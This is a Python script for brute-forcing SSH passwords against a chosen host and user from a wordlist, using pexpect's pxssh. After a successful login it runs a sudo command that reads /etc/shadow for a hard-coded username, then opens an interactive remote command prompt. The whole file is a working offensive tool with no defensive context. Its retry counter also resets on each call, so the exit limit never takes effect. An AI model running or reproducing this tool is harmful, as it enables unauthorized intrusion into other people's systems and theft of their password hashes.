import argparse
import time
from pexpect import pxssh  

def connect(host, user, password):
    fails = 0
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print ('[+] Password Found: ' + str(password))
        return s
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(host, user, password)
        elif fails > 5:
            print ('[-] Exiting: Maxed out')
            exit(0)
        return None

def main():
    parser = argparse.ArgumentParser(description = 'SSH Bruteforce')
    parser.add_argument('host', help = 'specify target host')
    parser.add_argument('user', help = 'specify target user')
    parser.add_argument('file', help = 'specify password file')
    args = parser.parse_args()
    if args.host and args.user and args.file:
        with open(args.file,'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                print ('[*]Testing Password ' + str(password))
                con = connect(args.host, args.user, password)
                if con:
                    hash(con, password)
                    print ('[++] Connected, Issue Commands')
                    cmd = input('>>>')
                    while cmd != 'q' and cmd != 'Q':
                        con.sendline(cmd)
                        con.prompt()
                        print (con.before)
                        cmd = input('>>>')
    else:
        print (parser.usage)
        exit(0)

def hash(con, password):
    con.sendline('sudo cat /etc/shadow | grep ashwin')
    con.expect(':')
    con.sendline(password)
    con.prompt()
    print (con.before)

if __name__ == '__main__':
    main()